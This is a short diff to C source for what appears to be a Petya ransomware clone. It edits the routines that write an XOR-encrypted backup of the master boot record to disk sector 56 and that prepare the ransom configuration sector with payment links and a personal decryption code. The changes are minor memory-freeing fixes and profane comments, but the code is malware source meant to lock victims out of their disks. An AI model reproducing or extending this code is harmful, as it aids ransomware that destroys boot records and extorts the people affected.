@@ -75,8 +75,8 @@ PetyaBackupMBR(
 	PetyaWriteSector( hHard, 56, EncryptedBootSector, 512 );//Set the new encrypted (xored 0x37)
 														   //MBR to sect 56 as backup
 
-	VirtualFree( EncryptedBootSector, sizeof( EncryptedBootSector ), MEM_RELEASE );
-	VirtualFree( BootSector, sizeof( BootSector ), MEM_RELEASE );
+	VirtualFree( EncryptedBootSector, 512, MEM_RELEASE );
+	VirtualFree( BootSector, 512, MEM_RELEASE );
 }
 
 VOID
@@ -178,7 +178,7 @@ PetyaConfigurationSector(
 
 
 	//Really unoptimized but whatever the fuck.
-	PCHAR FirstLink = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->FirstLink ),
+	PCHAR FirstLink = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->FirstLink ), // this should use strlen smh
 												MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
 	PCHAR SecondLink = ( PCHAR )VirtualAlloc( 0, sizeof( Dawger->SecondLink ),
 												MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
@@ -226,7 +226,7 @@ PetyaConfigurationSector(
 
 
 	//this really hurts my brain whatever
-	VirtualFree( FirstLink, sizeof( FirstLink ), MEM_RELEASE );
+	VirtualFree( FirstLink, sizeof( FirstLink ), MEM_RELEASE ); //should've been freed with strlen
 	VirtualFree( SecondLink, sizeof( SecondLink ), MEM_RELEASE );
 	VirtualFree( PersonalDecryptionCode, sizeof( PersonalDecryptionCode ), MEM_RELEASE );
 
